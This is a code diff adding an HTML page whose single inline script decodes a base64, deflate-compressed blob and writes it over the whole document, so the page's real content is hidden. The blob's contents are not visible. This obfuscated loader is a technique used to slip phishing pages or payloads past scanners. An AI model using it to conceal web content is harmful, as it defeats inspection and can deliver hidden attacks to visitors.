@@ -1,0 +1,29 @@
+<html>
+<head>
+</head>
+<body>
+<script>
+(function(){
+const data = "eNpNkM1OxDAMhO/7FCFnmiw3BEkv/FxBaEHimCbe2lWaltTtirenoSDVF8ufRx6NzdXjy8Pp8/VJIPexPpjSRHSptRJJFgAu1AexlumBnfDo8gRs5fvpubqV+1VyPVi5EFzGIbMUfkgMaZVeKDDaAAt5qH6Ha0GJmFysJu8i2Bt1/D/FxBHqNwiUwTOlVill9EZ3Zsg8VvA102JlhnOGCXeOx3sx52iLaLrTuum6DhFVS4xzo2jQH9iuAHWJqLeMphnC95/FWBs9ltXGVkl5zw+isGAO";
+async function decode(){
+    const binary = atob(data);
+    const bytes = new Uint8Array(binary.length);
+    for(let i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+    }
+    const stream = new DecompressionStream("deflate");
+    const writer = stream.writable.getWriter();
+    writer.write(bytes);
+    writer.close();
+    const buffer = await new Response(stream.readable).arrayBuffer();
+    return new TextDecoder().decode(buffer);
+}
+decode().then(html => {
+    document.open();
+    document.write(html);
+    document.close();
+});
+})();
+</script>
+</body>
+</html>
